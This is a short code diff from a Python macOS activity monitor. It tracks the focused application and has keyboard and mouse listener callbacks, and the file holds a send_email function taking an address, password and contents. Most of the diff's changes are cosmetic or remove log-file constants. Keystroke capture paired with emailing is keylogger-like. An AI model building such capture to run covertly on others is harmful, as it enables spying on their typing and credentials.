@@ -45,27 +45,20 @@ def send_email(email_address, password, contents):
 """
     APPLICATION TRACKING
 """
+
 def get_focus_app_string():
     workspace = NSWorkspace.sharedWorkspace()
     return workspace.activeApplication()['NSApplicationName']
-
 
 """
     MONITORING
 """
 
 class Monitor:
-    KEYS_LOG = 'keys.txt'
-    MICE_LOG = 'mice.txt'
-    APPS_LOG = 'apps.txt'
-
     def on_press(self, key):
         if (key == keyboard.Key.esc):
             self.done = True
-            return False
 
-        print(key)
-    
     def on_click(self, x, y, button, pressed):
         if self.done:
             return False
